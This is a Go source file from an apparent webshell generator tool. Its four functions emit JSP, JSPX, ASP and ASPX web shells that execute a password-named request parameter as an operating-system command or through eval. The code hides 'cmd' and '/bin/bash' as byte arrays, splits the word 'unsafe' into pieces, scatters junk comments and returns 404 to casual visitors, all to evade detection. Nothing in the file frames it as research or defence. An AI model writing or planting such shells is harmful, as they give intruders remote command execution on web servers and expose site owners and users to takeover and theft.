package shell

import "webshell/common"

func Jsp() {
	common.Filename = "xxxxxkka.jsp"
	common.Webshells = `<%  String AY85C = request.getParameter("` + common.Password + `");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals("\\")){pb = new ProcessBuilder(new /*ZU9HS9ML28*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), AY85C);}else{pb = new ProcessBuilder/*ZU9HS9ML28*/(new/*ZU9HS9ML28*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), AY85C);}if (AY85C != null) {Process process = pb.start();java.util.Scanner EB7vGQh7 = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A");String op="";op = EB7vGQh7.hasNext() ? EB7vGQh7.next() : op;EB7vGQh7.close();out.print(op);}else {response.sendError(404);} %>`
}

func Jspx() {
	common.Filename = "xxxxkkka.jspx"
	common.Webshells = `
<hi xmlns:hi="http://java.sun.com/JSP/Page">
<pre><hi:scriptlet>
String Af8uW = request.getParameter("` + common.Password + `");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals("\\")){pb = new ProcessBuilder(new /*Z24pg1a5rQ*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), Af8uW);}else{pb = new ProcessBuilder/*Z24pg1a5rQ*/(new/*Z24pg1a5rQ*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), Af8uW);}if (Af8uW != null) {Process process = pb.start();java.util.Scanner E683BD82 = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A");String op="";op = E683BD82.hasNext() ? E683BD82.next() : op;E683BD82.close();out.print(op);}else {response.sendError(404);}</hi:scriptlet>
</pre></hi>`
}

func Asp() {
	common.Filename = "xxxxkkka.aspx"
	common.Webshells = `<% 
<!--
Class C8Fl
    public property let SXEWH(Dr6d76698)
    exeCute(Dr6d76698)REM IXMQD)
    end property
End Class

Set a= New C8Fl
a.SXEWH= request("` + common.Password + `")
-->
%>`
}

func Aspx() {
	common.Filename = "xxxxkkka.asp"
	common.Webshells = `<% function Ekj04pi9(){var GEPH="unsa",YACK="fe",CCi7=GEPH+YACK;return CCi7;}var PAY:String=Request["` + common.Password + `"];~eval/*ZlA9h2RV68*/(PAY,Ekj04pi9());%><%@Page Language=JS%>`
}
